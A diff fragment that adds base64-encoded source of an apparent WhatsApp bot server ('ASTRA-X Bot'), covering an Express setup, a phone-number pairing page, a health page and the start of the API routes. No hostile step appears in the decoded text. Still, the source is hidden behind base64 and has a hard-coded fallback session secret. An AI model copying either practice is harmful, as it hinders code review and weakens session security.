+    "eHRlbmRlZDogdHJ1ZSwgbGltaXQ6ICc1bWInIH0pKTsKYXBwLnVzZShleHByZXNzLnN0YXRpYyhwYXRo",
+    "LmpvaW4oX19kaXJuYW1lLCAnLi4vcHVibGljJykpKTsKYXBwLnVzZShzZXNzaW9uKHsKICBzZWNyZXQ6",
+    "IHByb2Nlc3MuZW52LlNFU1NJT05fU0VDUkVUIHx8ICdhc3RyYXhfc2VjcmV0X2tleV8yMDI0JywgIC8v",
+    "IG11c3QgbWF0Y2ggY29uZmlnLmpzIGRlZmF1bHQKICByZXNhdmU6IGZhbHNlLAogIHNhdmVVbmluaXRp",
+    "YWxpemVkOiBmYWxzZSwKICBjb29raWU6IHsgbWF4QWdlOiAyNCAqIDYwICogNjAgKiAxMDAwLCBodHRw",
+    "T25seTogdHJ1ZSB9LAp9KSk7CgovLyDilIDilIAgUmVxdWVzdCBsb2dnZXIg4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACmFwcC51c2UoKHJlcSwgcmVzLCBuZXh0KSA9",
+    "PiB7CiAgY29uc3QgdCA9IERhdGUubm93KCk7CiAgcmVzLm9uKCdmaW5pc2gnLCAoKSA9PiB7CiAgICBj",
+    "b25zdCBtcyAgID0gRGF0ZS5ub3coKSAtIHQ7CiAgICBjb25zdCBpY29uID0gcmVzLnN0YXR1c0NvZGUg",
+    "Pj0gNTAwID8gJ/CflLQnIDogcmVzLnN0YXR1c0NvZGUgPj0gNDAwID8gJ/Cfn6EnIDogJ/Cfn6InOwog",
+    "ICAgbG9nZ2VyLmluZm8oYCR7aWNvbn0gJHtyZXEubWV0aG9kfSAke3JlcS5wYXRofSAke3Jlcy5zdGF0",
+    "dXNDb2RlfSAoJHttc31tcylgKTsKICB9KTsKICBuZXh0KCk7Cn0pOwoKLy8g4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCi8vIFBBSVJJTkcgUEFHRSAg4oaSICBsb2NhbGhvc3Q6",
+    "MzAwMAovLyDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAKYXBwLmdldCgn",
+    "LycsIChyZXEsIHJlcykgPT4gewogIGNvbnN0IGh0bWxGaWxlID0gcGF0aC5qb2luKF9fZGlybmFtZSwg",
+    "Jy4uL3B1YmxpYy9pbmRleC5odG1sJyk7CiAgaWYgKGZzLmV4aXN0c1N5bmMoaHRtbEZpbGUpKSByZXR1",
+    "cm4gcmVzLnNlbmRGaWxlKGh0bWxGaWxlKTsKCiAgcmVzLnNlbmQoYDwhRE9DVFlQRSBodG1sPjxodG1s",
+    "IGxhbmc9ImVuIj48aGVhZD4KPG1ldGEgY2hhcnNldD0iVVRGLTgiPjxtZXRhIG5hbWU9InZpZXdwb3J0",
+    "IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsaW5pdGlhbC1zY2FsZT0xIj4KPHRpdGxlPkFTVFJB",
+    "LVggQm90IOKAlCBDb25uZWN0PC90aXRsZT4KPHN0eWxlPgoqe2JveC1zaXppbmc6Ym9yZGVyLWJveDtt",
+    "YXJnaW46MDtwYWRkaW5nOjB9CmJvZHl7Zm9udC1mYW1pbHk6J1NlZ29lIFVJJyxzYW5zLXNlcmlmO2Jh",
+    "Y2tncm91bmQ6IzA2MGQxNDttaW4taGVpZ2h0OjEwMHZoOwogIGRpc3BsYXk6ZmxleDtmbGV4LWRpcmVj",
+    "dGlvbjpjb2x1bW47YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpjZW50ZXI7CiAgY29s",
+    "b3I6I2UyZThmMDtwYWRkaW5nOjIwcHh9Ci5sb2dve3dpZHRoOjIyMHB4O2hlaWdodDoyMjBweDtvYmpl",
+    "Y3QtZml0OmNvbnRhaW47Ym9yZGVyLXJhZGl1czoyMHB4OwogIG1hcmdpbi1ib3R0b206MTJweDtmaWx0",
+    "ZXI6ZHJvcC1zaGFkb3coMCAwIDMwcHggcmdiYSgzNywyMTEsMTAyLC41KSl9Ci5jYXJke2JhY2tncm91",
+    "bmQ6cmdiYSgxMSwxOCwzMCwuOTcpO2JvcmRlcjoxcHggc29saWQgcmdiYSgzNywyMTEsMTAyLC4yKTsK",
+    "ICBib3JkZXItcmFkaXVzOjIwcHg7cGFkZGluZzoyOHB4IDI0cHg7d2lkdGg6MTAwJTttYXgtd2lkdGg6",
+    "NDQwcHg7dGV4dC1hbGlnbjpjZW50ZXJ9Cmgxe2ZvbnQtc2l6ZToxLjVyZW07Zm9udC13ZWlnaHQ6OTAw",
+    "O21hcmdpbi1ib3R0b206NHB4OwogIGJhY2tncm91bmQ6bGluZWFyLWdyYWRpZW50KDkwZGVnLCMyNWQz",
+    "NjYsIzNiODJmNiwjOGI1Y2Y2KTsKICAtd2Via2l0LWJhY2tncm91bmQtY2xpcDp0ZXh0Oy13ZWJraXQt",
+    "dGV4dC1maWxsLWNvbG9yOnRyYW5zcGFyZW50O2JhY2tncm91bmQtY2xpcDp0ZXh0fQpwe2NvbG9yOiM2",
+    "NDc0OGI7Zm9udC1zaXplOi44OHJlbTttYXJnaW4tYm90dG9tOjIycHh9CmlucHV0e3dpZHRoOjEwMCU7",
+    "YmFja2dyb3VuZDpyZ2JhKDI1NSwyNTUsMjU1LC4wNik7Ym9yZGVyOjFweCBzb2xpZCByZ2JhKDI1NSwy",
+    "NTUsMjU1LC4xMik7CiAgYm9yZGVyLXJhZGl1czoxMHB4O2NvbG9yOiNlMmU4ZjA7cGFkZGluZzoxM3B4",
+    "IDE2cHg7Zm9udC1zaXplOjFyZW07bWFyZ2luLWJvdHRvbToxMnB4O291dGxpbmU6bm9uZX0KaW5wdXQ6",
+    "Zm9jdXN7Ym9yZGVyLWNvbG9yOiMyNWQzNjZ9CmJ1dHRvbnt3aWR0aDoxMDAlO2JhY2tncm91bmQ6bGlu",
+    "ZWFyLWdyYWRpZW50KDEzNWRlZywjMjVkMzY2LCMzYjgyZjYpO2NvbG9yOiNmZmY7CiAgYm9yZGVyOm5v",
+    "bmU7Ym9yZGVyLXJhZGl1czoxMHB4O3BhZGRpbmc6MTRweDtmb250LXNpemU6MXJlbTtmb250LXdlaWdo",
+    "dDo3MDA7Y3Vyc29yOnBvaW50ZXJ9CmJ1dHRvbjpob3ZlcntvcGFjaXR5Oi44OH1idXR0b246ZGlzYWJs",
+    "ZWR7b3BhY2l0eTouNTtjdXJzb3I6bm90LWFsbG93ZWR9Ci5yZXNldC1idG57YmFja2dyb3VuZDpyZ2Jh",
+    "KDI1NSwyNTUsMjU1LC4wNik7Y29sb3I6Izk0YTNiODttYXJnaW4tdG9wOjhweDtmb250LXNpemU6Ljly",
+    "ZW19Ci5jb2RlLWJveHtiYWNrZ3JvdW5kOiMwZjFhMmU7Ym9yZGVyOjJweCBzb2xpZCAjMjVkMzY2O2Jv",
+    "cmRlci1yYWRpdXM6MTRweDtwYWRkaW5nOjIycHg7CiAgbWFyZ2luLXRvcDoxOHB4O2xldHRlci1zcGFj",
+    "aW5nOjhweDtmb250LXNpemU6Mi4ycmVtO2ZvbnQtd2VpZ2h0OjkwMDtjb2xvcjojMjVkMzY2OwogIGN1",
+    "cnNvcjpwb2ludGVyO3VzZXItc2VsZWN0OmFsbDtmb250LWZhbWlseTptb25vc3BhY2V9Ci5jb2RlLWJv",
+    "eDpob3ZlcntiYWNrZ3JvdW5kOiMwYTEyMjB9Ci5zdGVwc3t0ZXh0LWFsaWduOmxlZnQ7bWFyZ2luLXRv",
+    "cDoxOHB4O2ZvbnQtc2l6ZTouODJyZW07Y29sb3I6Izk0YTNiODtsaW5lLWhlaWdodDoyfQouc3RlcHMg",
+    "Yntjb2xvcjojMjVkMzY2fS5zdGVwcyBzcGFue2NvbG9yOiM2NDc0OGI7Zm9udC1zaXplOi43NXJlbX0K",
+    "LnN0YXR1c3tmb250LXNpemU6Ljg1cmVtO21hcmdpbi10b3A6MTJweDtwYWRkaW5nOjEwcHggMTRweDti",
+    "b3JkZXItcmFkaXVzOjhweDtkaXNwbGF5Om5vbmV9Ci5va3tiYWNrZ3JvdW5kOnJnYmEoMzcsMjExLDEw",
+    "MiwuMSk7Y29sb3I6IzI1ZDM2Njtib3JkZXI6MXB4IHNvbGlkIHJnYmEoMzcsMjExLDEwMiwuMyl9Ci5l",
+    "cnJ7YmFja2dyb3VuZDpyZ2JhKDIzOSw2OCw2OCwuMSk7Y29sb3I6I2VmNDQ0NDtib3JkZXI6MXB4IHNv",
+    "bGlkIHJnYmEoMjM5LDY4LDY4LC4zKX0KLmxpbmtze2Rpc3BsYXk6ZmxleDtnYXA6MTBweDttYXJnaW4t",
+    "dG9wOjE4cHg7anVzdGlmeS1jb250ZW50OmNlbnRlcn0KLmxpbmtzIGF7Zm9udC1zaXplOi43OHJlbTtj",
+    "b2xvcjojM2I4MmY2O3RleHQtZGVjb3JhdGlvbjpub25lOwogIGJhY2tncm91bmQ6cmdiYSg1OSwxMzAs",
+    "MjQ2LC4xKTtwYWRkaW5nOjZweCAxNHB4O2JvcmRlci1yYWRpdXM6OHB4fQo8L3N0eWxlPjwvaGVhZD48",
+    "Ym9keT4KPGltZyBzcmM9Ii9Bc3RyYWxvZ28ucG5nIiBhbHQ9IkFTVFJBLVgiIGNsYXNzPSJsb2dvIiBv",
+    "bmVycm9yPSJ0aGlzLnN0eWxlLmRpc3BsYXk9J25vbmUnIj4KPGRpdiBjbGFzcz0iY2FyZCI+CiAgPGgx",
+    "PkFTVFJBLVggQm90PC9oMT4KICA8cD5FbnRlciB5b3VyIFdoYXRzQXBwIG51bWJlciB0byBnZXQgYSBw",
+    "YWlyaW5nIGNvZGU8L3A+CiAgPGlucHV0IGlkPSJwaG9uZSIgdHlwZT0idGVsIiBwbGFjZWhvbGRlcj0i",
+    "MjU2NzQ3MzA0MTk2IChjb3VudHJ5IGNvZGUsIG5vICspIj4KICA8YnV0dG9uIGlkPSJidG4iIG9uY2xp",
+    "Y2s9InBhaXIoKSI+8J+UlyBHZXQgUGFpcmluZyBDb2RlPC9idXR0b24+CiAgPGJ1dHRvbiBjbGFzcz0i",
+    "cmVzZXQtYnRuIiBvbmNsaWNrPSJyZXNldCgpIj7wn5SEIFJlc2V0PC9idXR0b24+CiAgPGRpdiBpZD0i",
+    "c3RhdHVzIiBjbGFzcz0ic3RhdHVzIj48L2Rpdj4KICA8ZGl2IGlkPSJjb2RlQm94IiBjbGFzcz0iY29k",
+    "ZS1ib3giIHN0eWxlPSJkaXNwbGF5Om5vbmUiIG9uY2xpY2s9ImNvcHkoKSIgdGl0bGU9IlRhcCB0byBj",
+    "b3B5Ij48L2Rpdj4KICA8ZGl2IGlkPSJzdGVwcyIgY2xhc3M9InN0ZXBzIiBzdHlsZT0iZGlzcGxheTpu",
+    "b25lIj4KICAgIDxiPkhvdyB0byBsaW5rIG9uIHlvdXIgcGhvbmU6PC9iPjxicj4KICAgIDEuIE9wZW4g",
+    "V2hhdHNBcHAg4oaSIHRhcCDii64gTWVudTxicj4KICAgIDIuIFRhcCA8Yj5MaW5rZWQgRGV2aWNlczwv",
+    "Yj48YnI+CiAgICAzLiBUYXAgPGI+TGluayBhIERldmljZTwvYj48YnI+CiAgICA0LiBUYXAgPGI+TGlu",
+    "ayB3aXRoIHBob25lIG51bWJlciBpbnN0ZWFkPC9iPjxicj4KICAgIDUuIEVudGVyIHRoZSBjb2RlIGFi",
+    "b3ZlPGJyPgogICAgPHNwYW4+Q29kZSBleHBpcmVzIGluIDUgbWludXRlcy4gVGFwIHRvIGNvcHkuPC9z",
+    "cGFuPgogIDwvZGl2PgogIDxkaXYgY2xhc3M9ImxpbmtzIj4KICAgIDxhIGhyZWY9Ii9hZG1pbiI+8J+U",
+    "kCBBZG1pbjwvYT4KICAgIDxhIGhyZWY9Ii9oZWFsdGgiPvCfkoogSGVhbHRoPC9hPgogIDwvZGl2Pgo8",
+    "L2Rpdj4KPHNjcmlwdD4KbGV0IGN1cnJlbnRVc2VySWQgPSBudWxsOwphc3luYyBmdW5jdGlvbiBwYWly",
+    "KCkgewogIGNvbnN0IHBob25lID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bob25lJykudmFsdWUu",
+    "dHJpbSgpLnJlcGxhY2UoL1xcRC9nLCcnKTsKICBpZiAoIXBob25lIHx8IHBob25lLmxlbmd0aCA8IDcp",
+    "IHJldHVybiBzaG93KCfinYwgRW50ZXIgYSB2YWxpZCBwaG9uZSBudW1iZXInLCdlcnInKTsKICBkb2N1",
+    "bWVudC5nZXRFbGVtZW50QnlJZCgnYnRuJykuZGlzYWJsZWQgPSB0cnVlOwogIGRvY3VtZW50LmdldEVs",
+    "ZW1lbnRCeUlkKCdidG4nKS50ZXh0Q29udGVudCA9ICfij7MgR2VuZXJhdGluZy4uLic7CiAgc2hvdygn",
+    "4o+zIENvbm5lY3RpbmcgdG8gV2hhdHNBcHAuLi4nLCdvaycpOwogIHRyeSB7CiAgICBjb25zdCByID0g",
+    "YXdhaXQgZmV0Y2goJy9hcGkvcGFpcicse21ldGhvZDonUE9TVCcsaGVhZGVyczp7J0NvbnRlbnQtVHlw",
+    "ZSc6J2FwcGxpY2F0aW9uL2pzb24nfSxib2R5OkpTT04uc3RyaW5naWZ5KHtwaG9uZU51bWJlcjpwaG9u",
+    "ZX0pfSk7CiAgICBjb25zdCBkID0gYXdhaXQgci5qc29uKCk7CiAgICBpZiAoZC5zdWNjZXNzICYmIGQu",
+    "Y29kZSkgewogICAgICBjdXJyZW50VXNlcklkID0gZC51c2VySWQ7CiAgICAgIHNob3coJ+KchSBDb2Rl",
+    "IHJlYWR5ISBFbnRlciBpdCBpbiBXaGF0c0FwcCB3aXRoaW4gNSBtaW51dGVzLicsJ29rJyk7CiAgICAg",
+    "IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb2RlQm94JykudGV4dENvbnRlbnQgPSBkLmNvZGU7CiAg",
+    "ICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb2RlQm94Jykuc3R5bGUuZGlzcGxheSA9ICdibG9j",
+    "ayc7CiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdGVwcycpLnN0eWxlLmRpc3BsYXkgPSAn",
+    "YmxvY2snOwogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYnRuJykudGV4dENvbnRlbnQgPSAn",
+    "8J+UlyBHZXQgTmV3IENvZGUnOwogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYnRuJykuZGlz",
+    "YWJsZWQgPSBmYWxzZTsKICAgIH0gZWxzZSB7CiAgICAgIHNob3coJ+KdjCAnKyhkLm1lc3NhZ2V8fCdG",
+    "YWlsZWQuIFRyeSBhZ2Fpbi4nKSwnZXJyJyk7CiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdi",
+    "dG4nKS50ZXh0Q29udGVudCA9ICfwn5SXIEdldCBQYWlyaW5nIENvZGUnOwogICAgICBkb2N1bWVudC5n",
+    "ZXRFbGVtZW50QnlJZCgnYnRuJykuZGlzYWJsZWQgPSBmYWxzZTsKICAgIH0KICB9IGNhdGNoKGUpIHsK",
+    "ICAgIHNob3coJ+KdjCBOZXR3b3JrIGVycm9yLiBJcyB0aGUgYm90IHJ1bm5pbmc/JywnZXJyJyk7CiAg",
+    "ICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYnRuJykudGV4dENvbnRlbnQgPSAn8J+UlyBHZXQgUGFp",
+    "cmluZyBDb2RlJzsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdidG4nKS5kaXNhYmxlZCA9IGZh",
+    "bHNlOwogIH0KfQphc3luYyBmdW5jdGlvbiByZXNldCgpIHsKICBpZiAoY3VycmVudFVzZXJJZCkgYXdh",
+    "aXQgZmV0Y2goJy9hcGkvcGFpci9yZXNldCcse21ldGhvZDonUE9TVCcsaGVhZGVyczp7J0NvbnRlbnQt",
+    "VHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfSxib2R5OkpTT04uc3RyaW5naWZ5KHt1c2VySWQ6Y3VycmVu",
+    "dFVzZXJJZH0pfSkuY2F0Y2goKCk9Pnt9KTsKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY29kZUJv",
+    "eCcpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N0ZXBz",
+    "Jykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3RhdHVz",
+    "Jykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYnRuJyku",
+    "dGV4dENvbnRlbnQgPSAn8J+UlyBHZXQgUGFpcmluZyBDb2RlJzsKICBkb2N1bWVudC5nZXRFbGVtZW50",
+    "QnlJZCgnYnRuJykuZGlzYWJsZWQgPSBmYWxzZTsKICBjdXJyZW50VXNlcklkID0gbnVsbDsKfQpmdW5j",
+    "dGlvbiBzaG93KG1zZyx0eXBlKXtjb25zdCBzPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdGF0dXMn",
+    "KTtzLnRleHRDb250ZW50PW1zZztzLmNsYXNzTmFtZT0nc3RhdHVzICcrdHlwZTtzLnN0eWxlLmRpc3Bs",
+    "YXk9J2Jsb2NrJzt9CmZ1bmN0aW9uIGNvcHkoKXtjb25zdCBjPWRvY3VtZW50LmdldEVsZW1lbnRCeUlk",
+    "KCdjb2RlQm94JykudGV4dENvbnRlbnQ7bmF2aWdhdG9yLmNsaXBib2FyZD8ud3JpdGVUZXh0KGMpLnRo",
+    "ZW4oKCk9PnNob3coJ/Cfk4sgQ29kZSBjb3BpZWQhJywnb2snKSk7fQpkb2N1bWVudC5nZXRFbGVtZW50",
+    "QnlJZCgncGhvbmUnKS5hZGRFdmVudExpc3RlbmVyKCdrZXlwcmVzcycsZT0+e2lmKGUua2V5PT09J0Vu",
+    "dGVyJylwYWlyKCk7fSk7Cjwvc2NyaXB0PjwvYm9keT48L2h0bWw+YCk7Cn0pOwo7CgovLyDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAKLy8gSEVBTFRIIFBBR0UgIOKGkiAgbG9j",
+    "YWxob3N0OjMwMDAvaGVhbHRoCi8vIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkAphcHAuZ2V0KCcvaGVhbHRoJywgKHJlcSwgcmVzKSA9PiB7CiAgY29uc3QgaHRtbEZpbGUgPSBw",
+    "YXRoLmpvaW4oX19kaXJuYW1lLCAnLi4vcHVibGljL2hlYWx0aC5odG1sJyk7CiAgaWYgKGZzLmV4aXN0",
+    "c1N5bmMoaHRtbEZpbGUpKSByZXR1cm4gcmVzLnNlbmRGaWxlKGh0bWxGaWxlKTsKCiAgLy8gRmFsbGJh",
+    "Y2sgaW5saW5lIGhlYWx0aCBwYWdlCiAgY29uc3Qgc2Vzc2lvbnMgPSBnZXRBbGxTZXNzaW9ucygpOwog",
+    "IGNvbnN0IGFjdGl2ZSAgID0gc2Vzc2lvbnMuZmlsdGVyKHMgPT4gcy5pc0FjdGl2ZSkubGVuZ3RoOwog",
+    "IGNvbnN0IG1lbSAgICAgID0gKHByb2Nlc3MubWVtb3J5VXNhZ2UoKS5oZWFwVXNlZCAvIDEwMjQgLyAx",
+    "MDI0KS50b0ZpeGVkKDEpOwogIGNvbnN0IHVwICAgICAgID0gTWF0aC5mbG9vcihwcm9jZXNzLnVwdGlt",
+    "ZSgpKTsKICBjb25zdCBoPU1hdGguZmxvb3IodXAvMzYwMCksIG09TWF0aC5mbG9vcigodXAlMzYwMCkv",
+    "NjApLCBzPXVwJTYwOwoKICByZXMuc2VuZChgPCFET0NUWVBFIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxo",
+    "ZWFkPgo8bWV0YSBjaGFyc2V0PSJVVEYtOCI+PG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9Indp",
+    "ZHRoPWRldmljZS13aWR0aCxpbml0aWFsLXNjYWxlPTEiPgo8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNo",
+    "IiBjb250ZW50PSIxNSI+Cjx0aXRsZT5BU1RSQS1YIEhlYWx0aDwvdGl0bGU+CjxzdHlsZT4KKntib3gt",
+    "c2l6aW5nOmJvcmRlci1ib3g7bWFyZ2luOjA7cGFkZGluZzowfQpib2R5e2ZvbnQtZmFtaWx5OidTZWdv",
+    "ZSBVSScsc2Fucy1zZXJpZjtiYWNrZ3JvdW5kOiMwNjBkMTQ7bWluLWhlaWdodDoxMDB2aDsKICBkaXNw",
+    "bGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1uO2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNv",
+    "bnRlbnQ6Y2VudGVyO2NvbG9yOiNlMmU4ZjA7cGFkZGluZzoyMHB4fQpoMXtmb250LXNpemU6MnJlbTtm",
+    "b250LXdlaWdodDo5MDA7bWFyZ2luLWJvdHRvbTo2cHg7CiAgYmFja2dyb3VuZDpsaW5lYXItZ3JhZGll",
+    "bnQoOTBkZWcsIzI1ZDM2NiwjM2I4MmY2KTsKICAtd2Via2l0LWJhY2tncm91bmQtY2xpcDp0ZXh0Oy13",
+    "ZWJraXQtdGV4dC1maWxsLWNvbG9yOnRyYW5zcGFyZW50O2JhY2tncm91bmQtY2xpcDp0ZXh0fQouZ3Jp",
+    "ZHtkaXNwbGF5OmdyaWQ7Z3JpZC10ZW1wbGF0ZS1jb2x1bW5zOnJlcGVhdChhdXRvLWZpdCxtaW5tYXgo",
+    "MTQwcHgsMWZyKSk7Z2FwOjEycHg7CiAgbWFyZ2luLXRvcDoyNHB4O3dpZHRoOjEwMCU7bWF4LXdpZHRo",
+    "OjYwMHB4fQouY2FyZHtiYWNrZ3JvdW5kOnJnYmEoMTEsMTgsMzAsLjk3KTtib3JkZXI6MXB4IHNvbGlk",
+    "IHJnYmEoMzcsMjExLDEwMiwuMTUpOwogIGJvcmRlci1yYWRpdXM6MTRweDtwYWRkaW5nOjIwcHg7dGV4",
+    "dC1hbGlnbjpjZW50ZXJ9Ci52YWx7Zm9udC1zaXplOjEuOHJlbTtmb250LXdlaWdodDo5MDA7CiAgYmFj",
+    "a2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoOTBkZWcsIzI1ZDM2NiwjM2I4MmY2KTsKICAtd2Via2l0LWJh",
+    "Y2tncm91bmQtY2xpcDp0ZXh0Oy13ZWJraXQtdGV4dC1maWxsLWNvbG9yOnRyYW5zcGFyZW50O2JhY2tn",
+    "cm91bmQtY2xpcDp0ZXh0fQoubGJse2ZvbnQtc2l6ZTouNzJyZW07Y29sb3I6IzY0NzQ4YjttYXJnaW4t",
+    "dG9wOjRweDt0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2V9Ci5iYWRnZXtkaXNwbGF5OmlubGluZS1ibG9j",
+    "aztwYWRkaW5nOjZweCAyMHB4O2JvcmRlci1yYWRpdXM6MjBweDtmb250LXNpemU6Ljg1cmVtO2ZvbnQt",
+    "d2VpZ2h0OjcwMDsKICBiYWNrZ3JvdW5kOnJnYmEoMzcsMjExLDEwMiwuMTUpO2NvbG9yOiMyNWQzNjY7",
+    "Ym9yZGVyOjFweCBzb2xpZCByZ2JhKDM3LDIxMSwxMDIsLjMpO21hcmdpbi1ib3R0b206OHB4fQphe2Nv",
+    "bG9yOiMzYjgyZjY7Zm9udC1zaXplOi44NXJlbTttYXJnaW4tdG9wOjIwcHg7ZGlzcGxheTpibG9ja30K",
+    "PC9zdHlsZT48L2hlYWQ+PGJvZHk+CjxzcGFuIGNsYXNzPSJiYWRnZSI+8J+foiBBTElWRTwvc3Bhbj4K",
+    "PGgxPkFTVFJBLVggQm90PC9oMT4KPHAgc3R5bGU9ImNvbG9yOiM2NDc0OGI7Zm9udC1zaXplOi44NXJl",
+    "bSI+QXV0by1yZWZyZXNoZXMgZXZlcnkgMTVzPC9wPgo8ZGl2IGNsYXNzPSJncmlkIj4KICA8ZGl2IGNs",
+    "YXNzPSJjYXJkIj48ZGl2IGNsYXNzPSJ2YWwiPiR7c2Vzc2lvbnMubGVuZ3RofTwvZGl2PjxkaXYgY2xh",
+    "c3M9ImxibCI+VXNlcnM8L2Rpdj48L2Rpdj4KICA8ZGl2IGNsYXNzPSJjYXJkIj48ZGl2IGNsYXNzPSJ2",
+    "YWwiPiR7YWN0aXZlfTwvZGl2PjxkaXYgY2xhc3M9ImxibCI+QWN0aXZlPC9kaXY+PC9kaXY+CiAgPGRp",
+    "diBjbGFzcz0iY2FyZCI+PGRpdiBjbGFzcz0idmFsIj4ke21lbX1NQjwvZGl2PjxkaXYgY2xhc3M9Imxi",
+    "bCI+UkFNPC9kaXY+PC9kaXY+CiAgPGRpdiBjbGFzcz0iY2FyZCI+PGRpdiBjbGFzcz0idmFsIj4ke2h9",
+    "aCAke219bSAke3N9czwvZGl2PjxkaXYgY2xhc3M9ImxibCI+VXB0aW1lPC9kaXY+PC9kaXY+CjwvZGl2",
+    "Pgo8YSBocmVmPSIvIj7ihpAgUGFpcmluZyBQYWdlPC9hPgo8YSBocmVmPSIvYWRtaW4iPvCflJAgQWRt",
+    "aW4gUGFuZWw8L2E+CjwvYm9keT48L2h0bWw+YCk7Cn0pOwoKLy8g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCi8vIEFQSSBST1VURVMKLy8g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCgovLyBIZWFsdGggSlNPTgovLyBQaW5nIGVuZHBvaW50IOKAlCBh",
